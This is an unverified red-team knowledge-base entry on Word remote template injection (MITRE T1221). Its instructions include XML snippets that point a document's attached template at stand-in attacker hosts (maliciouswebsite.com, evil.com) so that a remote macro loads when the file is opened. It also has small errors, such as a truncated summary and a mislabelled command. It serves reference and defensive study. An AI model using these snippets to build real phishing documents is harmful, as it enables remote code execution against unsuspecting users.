---
id: 3947ac7e-489a-4d18-90a0-e9e189935658
name: Remote Template Injection via Malicious Macro and Attachment
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.902684+00:00'
updated_at: '2023-04-10T20:36:52.639547+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
- '[[Template Injection|T1221 - Template Injection]]'
tags:
- '[[DOCX - Template Injection]]'
- '[[Office - Attacks]]'
- '[[Remote Template]]'
commands:
- '[[Check for malicious template attachment]]'
- '[[XML file with external template link]]'
---

# Remote Template Injection via Malicious Macro and Attachment

## Summary

Remote Template Injection via Malicious Macro and Attachment is a social engineering attack that targets users through email attachments. The attacker creates a malicious macro or attachment that, when opened by the user, injects a remote template into the user’s system. This technique is used to g

## Description

# Description

Remote Template Injection via Malicious Macro and Attachment is a social engineering attack that targets users through email attachments. The attacker creates a malicious macro or attachment that, when opened by the user, injects a remote template into the user’s system. This technique is used to gain initial access to the target system and execute code remotely. The business value of this attack is that it allows the attacker to gain access to sensitive information stored on the target system, such as financial data, intellectual property, or personal information.

## Requirements

1. User must have access to email

1. User must have permission to open attachments

1. User must enable macros in the document

1. No specific tools are required for this attack

## Defense

1. Educate users on the dangers of opening attachments or enabling macros from unknown sources

1. Use email filters to block emails with suspicious attachments

1. Use endpoint protection software to detect and prevent the execution of malicious macros

## Objectives

1. Gain initial access to the target system

1. Execute code remotely

1. Access sensitive information stored on the target system

# Instructions

1. Replace the target URL in the XML data with the URL of the malicious macro.

**Code**: [[<?xml version="1.0" encoding="UTF-8" standalone="y]]

> This command is used to inject a malicious macro into a Microsoft Word document template file. The command modifies the XML data in the **.\word_rels\settings.xml.rels** file of the Word document, replacing the target URL of the template file with the URL of the malicious macro. This allows the macro to be executed when the document is opened, potentially leading to further compromise of the system.

**Command** ([[XML file with external template link]]):

```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://maliciouswebsite.com/macro.dotm" TargetMode="External"/></Relationships>
```

2. This command attaches a malicious template to the document.

**Code**: [[<?xml version="1.0" encoding="UTF-8" standalone="y]]

> The 'Target' field should contain the URL of the malicious template that will be attached to the document. The 'TargetMode' field should be set to 'External' to indicate that the template is located outside of the document. This command can be used to execute malicious code when the document is opened, so it should be used with caution and only in controlled environments.

**Command** ([[Check for malicious template attachment]]):

```bash
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
Target="https://evil.com/malicious.dotm" TargetMode="External"/></Relationships>
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]

### Techniques

- [[Template Injection|T1221 - Template Injection]]

## Commands Used

- [[Check for malicious template attachment]]
- [[XML file with external template link]]

## Tags

- [[DOCX - Template Injection]]
- [[Office - Attacks]]
- [[Remote Template]]
